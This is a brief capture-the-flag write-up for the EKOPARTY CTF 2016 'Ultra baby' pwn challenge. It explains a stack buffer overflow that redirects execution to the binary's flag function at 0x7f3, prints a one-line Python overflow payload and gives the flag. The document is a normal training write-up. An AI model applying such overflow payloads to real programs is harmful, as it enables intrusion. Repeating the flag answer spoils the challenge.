#EKOPARTY CTF 2016: Pwning 25

###Ultra baby
```
Reach the flag function!

nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 55000

Attachment
pwn25_5ae6e58885e7cd75.zip
```

##Solution
A string buffer overflow exploit.
The binary Flag function is at 0x7f3.
Payload:
```python
print 'aaaaaaaaaaaaaaaaaaaaaaa\xf3\x07\x00\x00'
```

Flag:
>EKO{Welcome_to_pwning_challs_2k16}
